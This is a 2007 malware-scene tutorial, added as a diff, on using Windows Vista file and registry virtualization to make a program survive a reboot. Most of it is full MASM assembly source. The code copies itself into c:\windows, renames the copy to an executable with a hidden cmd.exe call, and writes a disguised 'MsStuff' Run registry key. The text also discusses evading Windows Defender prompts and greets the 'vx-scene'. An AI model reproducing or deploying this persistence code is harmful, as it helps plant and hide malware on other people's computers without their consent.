@@ -1,0 +1,233 @@
+Vista Surviving the restart
+[tha N00b Way]
+Author:FakedMinded/EOF-Project
+eof-project.net||ass-koder.de.vu
+
+
+
+
+>Introduction
+
+Since most processes will run in userland mode by default 
+under vista ,MS didnt want to vandalize Authentic processes from running correctly,so they
+established virtualization trick to let processes store information they need virtually.
+In this article I am trying to get use of virtualization to setup a startup runner exeutable.
+
+>>Problems and Solutions
+
+The first probem is that when to copy a file Using CopyFile() the executable extension  
+(.exe,.com,.bat) is not allowed to be copied to the virtual folder.
+The second problem is that we dont know if the user ran our process in admintrator level
+by right clicking on the our executable file and choosing the admin run.
+
+Now going for the solution: 
+For the first one ,using "cmd /c rename file.txt malware.exe" will solve the extension
+thing.Yeah !! renaming uing cmd.exe .
+For the second problem we will use vista directory monitoring weakness ReadDirectoryChangesW()
+to watch if our executable will go to virtualized directory or not.
+
+>>Accessing Registry
+
+Dont try to access registry HKEY_LOCAL_MACHINE for two aspects I will discuss here first is that
+if you are in userland it will be redirected to somewhere in Reg other than your request and
+second there will be a tray icon bitching about blocked program from running so they are 
+stopped by WindowsDefender shit :)
+
+>Code
+
+Here I will mainly put a code I did on the fly(you can do better than this!!)
+One more Hint,ReadDirectryChangesW() monitor other threads Dir acces other than the one it run in
+so CopyFile() will be on a seprate thread .
+
+;------------------CODE
+.586
+.model flat,stdcall
+option casemap:none
+include \masm32\include\kernel32.inc
+include \masm32\include\user32.inc
+include \masm32\include\windows.inc
+include \masm32\include\advapi32.inc
+
+includelib \masm32\lib\kernel32.lib
+includelib \masm32\lib\user32.lib
+includelib \masm32\lib\advapi32.lib
+
+.data
+r00t db "c:\",0
+dest_ db "c:\windows\f0cQ.txt",0
+r00t_path db "c:\windows\f0cQ.exe",0
+run_path db "Software\Microsoft\Windows\CurrentVersion\Run\",0
+key_run db "MsStuff",0
+cmd db 'cmd.exe /c rename c:\',0
+cmd_ext db ' f0cQ.exe',0
+
+.data?
+buffer db 1024 dup(?)
+buf_msg db 512 dup(?)
+hDir dd ?
+bwr dd ?
+counter dd ?
+reg_h dd ?
+tid dd ?
+
+.code
+
+;-----------------------------------------------------\
+uni2str: ;                                            Functions to convert uni to aci
+xor edx,edx
+xor ebx,ebx
+@@:
+mov dl,byte ptr [esi]
+mov byte ptr [edi],dl
+inc edi
+add esi,2
+loop @b
+ret
+
+size_uni:;---------------------------------------|Size the unicode string
+xor ecx,ecx
+@@:
+add ecx,2
+cmp word ptr [esi],0
+jz @f
+add esi,2
+jmp @b
+@@:
+ret
+;----------------------------------------------------/End of my functions ;)
+
+lack_ proc       ;the seperate thread for CopyFile()
+LOCAL mem:DWORD
+invoke Sleep,1000
+invoke GlobalAlloc,0,1512
+mov mem,eax
+invoke GetModuleFileName,0,mem,512
+@@:
+invoke CopyFile,mem,offset dest_,FALSE
+invoke Sleep,1000
+jmp @b
+
+ret
+lack_ endp
+
+start:
+
+invoke CreateThread,0,0,offset lack_,0,0,offset tid
+invoke CreateFile,offset r00t ,FILE_LIST_DIRECTORY,FILE_SHARE_DELETE or FILE_SHARE_READ,0,\     ;be careful with 
+				OPEN_EXISTING,FILE_FLAG_BACKUP_SEMANTICS,0                      ;the parameters
+
+cmp eax,INVALID_HANDLE_VALUE
+je exit
+
+mov hDir,eax
+
+
+@1:
+
+
+invoke RtlZeroMemory,offset buf_msg,512
+
+invoke ReadDirectoryChangesW,hDir,offset buffer,1024,1,17fh,offset bwr,0,0   ;17fh meas all the Notification :p
+
+or eax,eax
+jz exit
+mov eax,offset buffer
+@@:
+
+push eax
+lea esi,[eax].FILE_NOTIFY_INFORMATION.FileName
+push esi
+call size_uni
+pop esi
+lea edi,offset buf_msg
+call uni2str
+invoke lstrlen,offset buf_msg
+add eax,offset buf_msg
+sub eax,8
+cmp word ptr[eax],"Qc0f"                       ;see if out exe got caught on our radar
+jne @f
+lea eax,buf_msg
+cmp word ptr [eax],"resU"                      ;is it UserLand
+jz found_virtualization
+@@:
+inc counter
+cmp counter,100
+je no_virtualization
+pop eax
+cmp [eax].FILE_NOTIFY_INFORMATION.NextEntryOffset,0
+jz start
+add eax,[eax].FILE_NOTIFY_INFORMATION.NextEntryOffset
+push eax
+
+jmp @b
+found_virtualization:                             ;found virtualization
+invoke GetExitCodeThread,tid,offset bwr
+invoke TerminateThread,tid,bwr
+invoke RtlZeroMemory,offset buffer,1024
+invoke lstrcat,offset buffer,offset cmd
+invoke lstrcat,offset buffer,offset buf_msg
+invoke lstrcat,offset buffer,offset cmd_ext
+invoke MessageBox,0,offset buffer,0,0
+invoke WinExec,offset buffer,SW_HIDE
+
+
+invoke RtlZeroMemory,offset buffer,1024
+push 0
+push "\:c"
+mov edx,esp
+invoke lstrcat,offset buffer,edx
+
+
+invoke lstrlen,offset buf_msg
+
+add eax,offset buf_msg
+sub eax,4
+mov dword ptr[eax],0
+invoke lstrcat,offset buffer,offset buf_msg
+push 0
+push "exe."
+mov ecx,esp
+invoke lstrcat,offset buffer,ecx
+invoke MessageBox,0,offset buffer,0,0
+
+invoke RegOpenKeyEx,HKEY_CURRENT_USER,offset run_path,0,KEY_ALL_ACCESS,offset reg_h
+invoke lstrlen,offset buffer
+
+invoke RegSetValueEx,reg_h,offset key_run,0,REG_SZ,offset buffer,eax
+invoke RegCloseKey,reg_h
+invoke DeleteFile,offset dest_
+
+invoke MessageBox,0,offset buffer,offset r00t,0
+jmp exit
+
+
+no_virtualization: ;///here we take the risk that the uer might stopped virtualization from our application
+invoke GetExitCodeThread,tid,offset bwr
+invoke TerminateThread,tid,bwr
+call @f
+db 'cmd /c rename "c:\windows\f0cQ.txt" f0cQ.exe',0
+@@:
+pop edx
+invoke WinExec,edx,SW_HIDE
+
+invoke RegOpenKeyEx,HKEY_CURRENT_USER,offset run_path,0,KEY_ALL_ACCESS,offset reg_h
+invoke RegSetValueEx,reg_h,offset key_run,0,REG_SZ,offset r00t_path,sizeof r00t_path-1
+invoke RegCloseKey,reg_h
+invoke DeleteFile,offset dest_
+invoke MessageBox,0,offset buf_msg,0,0
+exit:
+invoke ExitProcess,0
+end start
+;------------------End OF CODE
+
+
+>Final W0rds
+
+I hope you njoied the above ,For me I cant wait for a real working escaltion privilege vuln in vista
+to drop the above shit .
+oh..yeah Greetings to the eof-project members,and the whole vx-scene
+
+fakedminded/berniee<E0F>  CopyRites- 2007
+
+
+
